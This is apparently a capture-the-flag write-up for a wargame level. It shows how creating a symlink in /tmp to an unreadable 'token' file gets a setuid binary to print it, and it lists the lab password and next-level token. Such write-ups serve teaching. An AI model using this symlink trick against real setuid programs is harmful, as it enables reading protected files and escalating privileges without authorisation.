In this level, we have 2 files : an executable setuid with flag08 ownership 
`level08`, and a regular file `token` with no read permission.

The `level08` usage is :   
`./level08 [file to read]`

But we cannot read the `token` file.

So, what we need to do is to create a symlink to `token` file.

`ln -s /home/user/level08/token /tmp/test`

This will raise `a cannot operate on dangling symlink` if you don't put the
full path of the target file.

And now : `./level08 /tmp/test` gives us :

> quif5eloekouj29ke0vouxean

Which is the password for `su flag08`, and then we can `getflag` the token for
next level : 
> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

# Sources :

About symbolic links : 
- https://linuxhandbook.com/symbolic-link-linux/

Avoid the 'danglink symlink' error : 
- https://askubuntu.com/questions/533021/chmod-cannot-operate-on-dangling-symlink-etc-transmission-daemon-settings-js

